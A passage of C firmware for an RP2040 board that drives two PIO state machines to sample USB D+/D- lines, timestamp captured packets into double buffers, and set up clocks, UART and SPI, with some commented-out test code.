        "ldr r4, [pc, #24]\n"
        "orrs r3, r4\n"
        "str r0, [r3, #0]\n"
        "str r0, [r3, #0]\n"
        "orrs r1, r2\n"
        "str r5, [r1, #0]\n"
        "pop {r4, r5, r6, pc}\n"
        "movs r0, r0\n"
        "str r0, [r4, r0]\n"
        "lsls r0, r2, #3\n"
        "str r0, [r4, r0]\n"
        "movs r0, r0\n"
        "str r0, [r6, r0]\n"
        "lsls r0, r2, #3\n"
        "str r0, [r6, r0]\n"
    );
}

INLINE void reinit_dbuff(dbuff_t* dbuff) {
    memset(&(dbuff->g_buffer_info), 0, sizeof(dbuff->g_buffer_info));
    dbuff->g_buffer_info.limit = capture_limit_value();

}

//-----------------------------------------------------------------------------
static void capture_buffer(void)
{
  volatile uint32_t *PIO0_INSTR_MEM = (volatile uint32_t *)&PIO0->INSTR_MEM0;
  volatile uint32_t *PIO1_INSTR_MEM = (volatile uint32_t *)&PIO1->INSTR_MEM0;
  int index, packet;

  last_dbuff = NULL;
  curr_dbuff = NULL;

  memset(&dbuff1, 0, sizeof(dbuff1));
  memset(&dbuff2, 0, sizeof(dbuff2));

  reinit_dbuff(&dbuff1);
  reinit_dbuff(&dbuff2);

  curr_dbuff = &dbuff1;

  HAL_GPIO_DP_init();
  HAL_GPIO_DM_init();
  HAL_GPIO_START_init();
  func();
  
  RESETS_SET->RESET = RESETS_RESET_pio0_Msk | RESETS_RESET_pio1_Msk;
  RESETS_CLR->RESET = RESETS_RESET_pio0_Msk | RESETS_RESET_pio1_Msk;
  while (0 == RESETS->RESET_DONE_b.pio0 && 0 == RESETS->RESET_DONE_b.pio1);

  //g_buffer_info.fs = (g_capture_speed == CaptureSpeed_Full);
 // g_buffer_info.trigger = (g_capture_trigger == CaptureTrigger_Enabled);

  static const uint16_t pio0_ops[] =
  {
    // idle:
    /* 0 */  OP_MOV | MOV_DST_X | MOV_SRC_NULL | MOV_OP_INVERT,   // Reset the bit counter
    /* 1 */  OP_WAIT | WAIT_POL_1 | WAIT_SRC_PIN | WAIT_INDEX(0), // Wait until the bus goes idle
    /* 2 */  OP_WAIT | WAIT_POL_0 | WAIT_SRC_PIN | WAIT_INDEX(0), // Wait for the SOP

    // start0:
    /* 3 */  OP_NOP | OP_DELAY(1), // Skip to the middle of the bit

    // read0:
    /* 4 */  OP_JMP | JMP_COND_X_NZ_PD | JMP_ADDR(5/*next*/),  // Decrement the bit counter
    /* 5 */  OP_IN  | IN_SRC_PINS | IN_CNT(1), // Sample D+
    /* 6 */  OP_MOV | MOV_DST_OSR | MOV_SRC_PINS | MOV_OP_BIT_REV, // Sample D+ and D-
    /* 7 */  OP_OUT | OUT_DST_Y | OUT_CNT(2),
    /* 8 */  OP_JMP | JMP_COND_Y_ZERO | JMP_ADDR(21/*eop*/), // If both are 0, then it is an EOP
    /* 9 */  OP_NOP | OP_DELAY(3), // Skip to the middle of the bit
    /* 10 */ OP_JMP | JMP_COND_PIN | JMP_ADDR(4/*read0*/), // If D- is high, then D+ is low, read 0

    // read1:
    /* 11 */ OP_JMP | JMP_COND_X_NZ_PD | JMP_ADDR(12/*next*/), // Decrement the bit counter
    /* 12 */ OP_IN  | IN_SRC_PINS | IN_CNT(1), // Sample D+
    /* 13 */ OP_MOV | MOV_DST_OSR | MOV_SRC_PINS | MOV_OP_BIT_REV, // Sample D+ and D-
    /* 14 */ OP_OUT | OUT_DST_Y | OUT_CNT(2),
    /* 15 */ OP_JMP | JMP_COND_Y_ZERO | JMP_ADDR(21/*eop*/), // If both are 0, then it is an EOP
    /* 16 */ OP_JMP | JMP_COND_PIN | JMP_ADDR(3/*start0*/),  // Look for a low to high transition on
    /* 17 */ OP_JMP | JMP_COND_PIN | JMP_ADDR(3/*start0*/),  // D- to adjust the sample point location
    /* 18 */ OP_JMP | JMP_COND_PIN | JMP_ADDR(3/*start0*/),
    /* 19 */ OP_JMP | JMP_COND_PIN | JMP_ADDR(3/*start0*/),
    /* 20 */ OP_JMP | JMP_ADDR(11/*read1*/),

    // eop:
    /* 21 */ OP_PUSH, // Transfer the last data
    /* 22 */ OP_MOV | MOV_DST_ISR | MOV_SRC_X, // Transfer the bit count
    /* 23 */ OP_PUSH,

    // poll_reset:
    /* 24 */ OP_SET | SET_DST_X | SET_DATA(31),

    // poll_loop:
    /* 25 */ OP_MOV | MOV_DST_OSR | MOV_SRC_PINS | MOV_OP_BIT_REV, // Sample D+ and D-
    /* 26 */ OP_OUT | OUT_DST_Y | OUT_CNT(2),
    /* 27 */ OP_JMP | JMP_COND_Y_NZ_PD | JMP_ADDR(0/*idle*/), // If either is not zero, back to idle
    /* 28 */ OP_JMP | JMP_COND_X_NZ_PD | JMP_ADDR(25/*poll_loop*/),
    /* 29 */ OP_MOV | MOV_DST_ISR | MOV_SRC_NULL | MOV_OP_INVERT,
    /* 30 */ OP_PUSH,
    // Wrap to 0 from here

    // Entry point, wait for a START signal from the PIO1
    /* 31 */ OP_WAIT | WAIT_POL_1 | WAIT_SRC_PIN | WAIT_INDEX(2),
  };

  static const uint16_t pio1_ops[] =
  {
    /* 0 */  OP_NOP | OP_DELAY(31), // Wait for the PIO0 to start
    /* 1 */  OP_NOP | OP_DELAY(31),
    /* 2 */  OP_NOP | OP_DELAY(31),
    /* 3 */  OP_NOP | OP_DELAY(31),

    // wait_se0:
    /* 4 */  OP_MOV | MOV_DST_OSR | MOV_SRC_PINS | MOV_OP_BIT_REV,
    /* 5 */  OP_OUT | OUT_DST_Y | OUT_CNT(2),
    /* 6 */  OP_JMP | JMP_COND_Y_NZ_PD | JMP_ADDR(4/*wait_se0*/),

    /* 7 */  OP_MOV | MOV_DST_OSR | MOV_SRC_PINS | MOV_OP_BIT_REV,
    /* 8 */  OP_OUT | OUT_DST_Y | OUT_CNT(2),
    /* 9 */  OP_JMP | JMP_COND_Y_NZ_PD | JMP_ADDR(4/*wait_se0*/),

    /* 10 */ OP_MOV | MOV_DST_OSR | MOV_SRC_PINS | MOV_OP_BIT_REV,
    /* 11 */ OP_OUT | OUT_DST_Y | OUT_CNT(2),
    /* 12 */ OP_JMP | JMP_COND_Y_NZ_PD | JMP_ADDR(4/*wait_se0*/),

    /* 13 */ OP_MOV | MOV_DST_OSR | MOV_SRC_PINS | MOV_OP_BIT_REV,
    /* 14 */ OP_OUT | OUT_DST_Y | OUT_CNT(2),
    /* 15 */ OP_JMP | JMP_COND_Y_NZ_PD | JMP_ADDR(4/*wait_se0*/),

    /* 16 */ OP_SET | SET_DST_PINS | SET_DATA(1), // Set the START output
    /* 17 */ OP_JMP | JMP_ADDR(17/*self*/), // Infinite loop
  };

  // PIO0 init
  PIO0->SM0_CLKDIV = ((curr_dbuff->g_buffer_info.fs ? 1 : 8) << PIO0_SM0_CLKDIV_INT_Pos);

  for (int i = 0; i < (int)(sizeof(pio0_ops)/sizeof(uint16_t)); i++)
    PIO0_INSTR_MEM[i] = pio0_ops[i];

  if (!curr_dbuff->g_buffer_info.fs)
  {
    PIO0_INSTR_MEM[1] = OP_WAIT | WAIT_POL_1 | WAIT_SRC_PIN | WAIT_INDEX(1);
    PIO0_INSTR_MEM[2] = OP_WAIT | WAIT_POL_0 | WAIT_SRC_PIN | WAIT_INDEX(1);
  }

  PIO0->SM0_EXECCTRL = ((curr_dbuff->g_buffer_info.fs ? DM_INDEX : DP_INDEX) << PIO0_SM0_EXECCTRL_JMP_PIN_Pos) |
      (30 << PIO0_SM0_EXECCTRL_WRAP_TOP_Pos) | (0 << PIO0_SM0_EXECCTRL_WRAP_BOTTOM_Pos);

  PIO0->SM0_SHIFTCTRL = PIO0_SM0_SHIFTCTRL_FJOIN_RX_Msk | PIO0_SM0_SHIFTCTRL_AUTOPUSH_Msk |
      (31 << PIO0_SM0_SHIFTCTRL_PUSH_THRESH_Pos);

  PIO0->SM0_PINCTRL = (DP_INDEX << PIO0_SM0_PINCTRL_IN_BASE_Pos);

  PIO0->SM0_INSTR = OP_JMP | JMP_ADDR(31);

  // PIO1 init
  PIO1->SM0_CLKDIV = ((curr_dbuff->g_buffer_info.fs ? 1 : 8) << PIO0_SM0_CLKDIV_INT_Pos);

  for (int i = 0; i < (int)(sizeof(pio1_ops)/sizeof(uint16_t)); i++)
    PIO1_INSTR_MEM[i] = pio1_ops[i];

  PIO1->SM0_EXECCTRL  = (31 << PIO0_SM0_EXECCTRL_WRAP_TOP_Pos) | (0 << PIO0_SM0_EXECCTRL_WRAP_BOTTOM_Pos);
  PIO1->SM0_SHIFTCTRL = 0;
  PIO1->SM0_PINCTRL   = (DP_INDEX << PIO0_SM0_PINCTRL_IN_BASE_Pos) |
      (START_INDEX << PIO0_SM0_PINCTRL_SET_BASE_Pos) | (1 << PIO0_SM0_PINCTRL_SET_COUNT_Pos);

  PIO1->SM0_INSTR = OP_SET | SET_DST_PINDIRS | SET_DATA(1); // Clear the START output
  PIO1->SM0_INSTR = OP_SET | SET_DST_PINS    | SET_DATA(0);

  index = 2;
  packet = 0;
  curr_dbuff->g_buffer_info.count = 0;

  set_error(false);

  uart1_puts("Capture started\r\n");

  PIO1_SET->CTRL = (1 << (PIO0_CTRL_SM_ENABLE_Pos + 0));
  PIO0_SET->CTRL = (1 << (PIO0_CTRL_SM_ENABLE_Pos + 0));

  while (1)
  {
    if (0 == (PIO0->FSTAT & (1 << (PIO0_FSTAT_RXEMPTY_Pos + 0))))
    {
      uint32_t v = PIO0->RXF0;

      if (v & 0x80000000)
      {
        curr_dbuff->g_buffer[packet+0] = 0xffffffff - v;
        curr_dbuff->g_buffer[packet+1] = TIMER->TIMELR;
        curr_dbuff->g_buffer_info.count++;
        packet = index;
        index += 2;

        if (curr_dbuff->g_buffer_info.count == curr_dbuff->g_buffer_info.limit)
        {
          last_dbuff = curr_dbuff;
          curr_dbuff = (curr_dbuff == &dbuff1) ? &dbuff2 : &dbuff1;
          memset(&(curr_dbuff->g_buffer_info), 0, sizeof(curr_dbuff->g_buffer_info));
          index = 2;
          packet = 0;
          reinit_dbuff(curr_dbuff);
          //uart1_puts("\r\nres\r\n");
        }
      }
      else
      {
        if (index < (sizeof(curr_dbuff->g_buffer)-4)) // Reserve the space for a possible reset
          curr_dbuff->g_buffer[index++] = v;
        else
        {
          last_dbuff = curr_dbuff;
          curr_dbuff = (curr_dbuff == &dbuff1) ? &dbuff2 : &dbuff1;
          memset(&(curr_dbuff->g_buffer_info), 0, sizeof(curr_dbuff->g_buffer_info));
          index = 2;
          packet = 0;
          reinit_dbuff(curr_dbuff);
          //uart1_puts("\r\nres\r\n");
        }
      }
    }
  }

  uart1_puts("Capture stopped, n packet: ");
  uart1_put_uint32_dec(packet);
  uart1_puts("\r\n");

}

//-----------------------------------------------------------------------------
static void change_setting(char *name, int *value, int count, const char *str[])
{
  (*value)++;

  if (*value == count)
    *value = 0;

  display_puts(name);
  display_puts(" changed to ");
  display_puts(str[*value]);
  display_puts("\r\n");
}

//-----------------------------------------------------------------------------
static void core1_main(void)
{
  HAL_GPIO_TRIGGER_in();
  HAL_GPIO_TRIGGER_pullup();

  while (1)
  {
    capture_buffer();
  }
}

//-----------------------------------------------------------------------------
static void core1_start(void)
{
  static uint32_t core1_stack[CORE1_STACK_SIZE];
  uint32_t *stack_ptr = core1_stack + CORE1_STACK_SIZE;
  const uint32_t cmd[] = { 0, 1, (uint32_t)SCB->VTOR, (uint32_t)stack_ptr, (uint32_t)core1_main };

  while (SIO->FIFO_ST & SIO_FIFO_ST_VLD_Msk)
    (void)SIO->FIFO_RD;

  __SEV();

  while (SIO->FIFO_ST & SIO_FIFO_ST_VLD_Msk)
    (void)SIO->FIFO_RD;

  for (int i = 0; i < (int)(sizeof(cmd) / sizeof(uint32_t)); i++)
  {
    SIO->FIFO_WR = cmd[i];
    __SEV();

    while (0 == (SIO->FIFO_ST & SIO_FIFO_ST_VLD_Msk));
    (void)SIO->FIFO_RD;
  }
}

//-----------------------------------------------------------------------------
void capture_init(void)
{
  core1_start();
}

//-----------------------------------------------------------------------------
void capture_command(int cmd)
{
  if (SIO->FIFO_ST & SIO_FIFO_ST_RDY_Msk)
    SIO->FIFO_WR = cmd;
}



//-----------------------------------------------------------------------------
static void sys_init(void)
{
  // Enable XOSC
  XOSC->CTRL     = (XOSC_CTRL_FREQ_RANGE_1_15MHZ << XOSC_CTRL_FREQ_RANGE_Pos);
  XOSC->STARTUP  = 47; // ~1 ms @ 12 MHz
  XOSC_SET->CTRL = (XOSC_CTRL_ENABLE_ENABLE << XOSC_CTRL_ENABLE_Pos);
  while (0 == (XOSC->STATUS & XOSC_STATUS_STABLE_Msk));

  // Setup SYS PLL for 12 MHz * 40 / 4 / 1 = 120 MHz
  RESETS_CLR->RESET = RESETS_RESET_pll_sys_Msk;
  while (0 == RESETS->RESET_DONE_b.pll_sys);

  PLL_SYS->CS = (1 << PLL_SYS_CS_REFDIV_Pos);
  PLL_SYS->FBDIV_INT = 40;
  PLL_SYS->PRIM = (4 << PLL_SYS_PRIM_POSTDIV1_Pos) | (1 << PLL_SYS_PRIM_POSTDIV2_Pos);

  PLL_SYS_CLR->PWR = PLL_SYS_PWR_VCOPD_Msk | PLL_SYS_PWR_PD_Msk;
  while (0 == PLL_SYS->CS_b.LOCK);

  PLL_SYS_CLR->PWR = PLL_SYS_PWR_POSTDIVPD_Msk;

  // Setup USB PLL for 12 MHz * 36 / 3 / 3 = 48 MHz
  RESETS_CLR->RESET = RESETS_RESET_pll_usb_Msk;
  while (0 == RESETS->RESET_DONE_b.pll_usb);

  PLL_USB->CS = (1 << PLL_SYS_CS_REFDIV_Pos);
  PLL_USB->FBDIV_INT = 36;
  PLL_USB->PRIM = (3 << PLL_SYS_PRIM_POSTDIV1_Pos) | (3 << PLL_SYS_PRIM_POSTDIV2_Pos);

  PLL_USB_CLR->PWR = PLL_SYS_PWR_VCOPD_Msk | PLL_SYS_PWR_PD_Msk;
  while (0 == PLL_USB->CS_b.LOCK);

  PLL_USB_CLR->PWR = PLL_SYS_PWR_POSTDIVPD_Msk;

  // Switch clocks to their final socurces
  CLOCKS->CLK_REF_CTRL = (CLOCKS_CLK_REF_CTRL_SRC_xosc_clksrc << CLOCKS_CLK_REF_CTRL_SRC_Pos);

  CLOCKS->CLK_SYS_CTRL = (CLOCKS_CLK_SYS_CTRL_AUXSRC_clksrc_pll_sys << CLOCKS_CLK_SYS_CTRL_AUXSRC_Pos);
  CLOCKS_SET->CLK_SYS_CTRL = (CLOCKS_CLK_SYS_CTRL_SRC_clksrc_clk_sys_aux << CLOCKS_CLK_SYS_CTRL_SRC_Pos);

  CLOCKS->CLK_PERI_CTRL = CLOCKS_CLK_PERI_CTRL_ENABLE_Msk |
      (CLOCKS_CLK_PERI_CTRL_AUXSRC_clk_sys << CLOCKS_CLK_PERI_CTRL_AUXSRC_Pos);

  CLOCKS->CLK_USB_CTRL = CLOCKS_CLK_USB_CTRL_ENABLE_Msk |
      (CLOCKS_CLK_USB_CTRL_AUXSRC_clksrc_pll_usb << CLOCKS_CLK_USB_CTRL_AUXSRC_Pos);

  CLOCKS->CLK_ADC_CTRL = CLOCKS_CLK_ADC_CTRL_ENABLE_Msk |
      (CLOCKS_CLK_ADC_CTRL_AUXSRC_clksrc_pll_usb << CLOCKS_CLK_ADC_CTRL_AUXSRC_Pos);

  CLOCKS->CLK_RTC_DIV = (256 << CLOCKS_CLK_RTC_DIV_INT_Pos); // 12MHz / 256 = 46875 Hz
  CLOCKS->CLK_RTC_CTRL = CLOCKS_CLK_RTC_CTRL_ENABLE_Msk |
      (CLOCKS_CLK_RTC_CTRL_AUXSRC_xosc_clksrc << CLOCKS_CLK_ADC_CTRL_AUXSRC_Pos);

  // Configure 1 us tick for watchdog and timer
  WATCHDOG->TICK = ((F_REF/F_TICK) << WATCHDOG_TICK_CYCLES_Pos) | WATCHDOG_TICK_ENABLE_Msk;

  // Enable GPIOs
  RESETS_CLR->RESET = RESETS_RESET_io_bank0_Msk | RESETS_RESET_pads_bank0_Msk;
  while (0 == RESETS->RESET_DONE_b.io_bank0 || 0 == RESETS->RESET_DONE_b.pads_bank0);
}

//-----------------------------------------------------------------------------
static void timer_init(void)
{
  RESETS_CLR->RESET = RESETS_RESET_timer_Msk;
  while (0 == RESETS->RESET_DONE_b.timer);

  TIMER->ALARM0 = TIMER->TIMELR + STATUS_TIMEOUT;
}

//-----------------------------------------------------------------------------
static void status_timer_task(void)
{
  if (TIMER->INTR & TIMER_INTR_ALARM_0_Msk)
  {
    TIMER->INTR = TIMER_INTR_ALARM_0_Msk;
    TIMER->ALARM0 = TIMER->TIMELR + STATUS_TIMEOUT;
    HAL_GPIO_LED_O_toggle();
  }
}


//-----------------------------------------------------------------------------
void set_error(bool error)
{
  HAL_GPIO_LED_R_write(error);
}

dbuff_t* __attribute__((optimize("O0"))) GetLastDbuffAddr(void) {
    return last_dbuff;
}

//-----------------------------------------------------------------------------
INLINE void rmain(void)
{
  sys_init();
  timer_init();

  HAL_GPIO_OCS_out();
  HAL_GPIO_OCS_set();

  HAL_GPIO_LED_O_out();
  HAL_GPIO_LED_O_clr();

  HAL_GPIO_LED_R_out();
  HAL_GPIO_LED_R_clr();

  uart_init(BAUD_RATE);  
  uart_puts("\r\nokhi on uart0!\r\n");

  uart1_init(BAUD_RATE);
  uart1_puts("\r\nokhi on uart1!\r\n");

  spi_init(spi1, 5000000); // ~4.6 mhz
  gpio_set_function(10, GPIO_FUNC_SPI);
  gpio_set_function(11, GPIO_FUNC_SPI);
  gpio_set_function(12, GPIO_FUNC_SPI);
  //gpio_set_function(13, GPIO_FUNC_SPI);

/*
  while (1)
  {
    unsigned char buff[256] = { 0x69, 0x42, 0x43, 0x44 };
    ospi_write_read_blocking(buff, buff, sizeof(buff));
    delay_ms(1000);
  }
*/

  capture_init();

  volatile dbuff_t* readed_last  = NULL;
  while (1)
  {
    if (readed_last != GetLastDbuffAddr())
    {
      readed_last = GetLastDbuffAddr();
      process_buffer();
      display_buffer();
      /*
      char buff[] = "hola";
      ospi_write_read_blocking(buff, buff, sizeof(buff) - 1);
      */
    }
  }
}

int main(void)
{
  rmain();
  return 0;
}

/*

  while (1)
  {
    //status_timer_task();
  }

FORCE_RAM_ATTR void ram_function() {
  uart_puts("\r\nRAM Function!\r\n");
}

FORCE_FLASH_ATTR void flash_function() {
  uart_puts("\r\nFLASH Function!\r\n");
}


  uart_init(BAUD_RATE);
  uart_puts("\r\nHello, Dreg!\r\n");
  uart_print_buffer_hex((uint8_t*) "hello" "\x9F" "Dreggy what about u?", 25, false, false);
  uart_puts("\r\n");
  uart_print_hexdump((uint8_t*)"hello" "\x9F" "Dreggy what about u?", 25);
  uart_puts("\r\n");
  uart_print_uint32_binary(0xFF004100);
  uart_puts("\r\n");
  uart_print_buffer_binary((uint8_t*)"hello" "\x9F" "Dreggy what about u?", 25, true, true);
  uart_puts("\r\n");
  uart_print_bindump((uint8_t*)"hello" "\x9F" "Dreggy what about u?", 25);
  uart_puts("\r\n");
  uart_put_uint32_hex((uint32_t)END_FLASH_ADDR);
  ram_function();
  flash_function();



int main(void)
{
 

  sys_init();
  timer_init();
  usb_init();
  // Detach and reattach the USB device from the host.
  // This is necessary for rebuilding and flashing using openocd, and for resetting to ensure the USB functions properly.
  usb_detach(); 
  delay_ms(100);
  usb_init();
  usb_attach();
  // ----
  usb_cdc_init();
  serial_number_init();
  capture_init();

  HAL_GPIO_LED_O_out();
  HAL_GPIO_LED_O_clr();

  HAL_GPIO_LED_R_out();
  HAL_GPIO_LED_R_clr();

  while (1)
  {
    usb_task();
    display_task();
    vcp_timer_task();
    status_timer_task();
  }

  return 0;
}
*/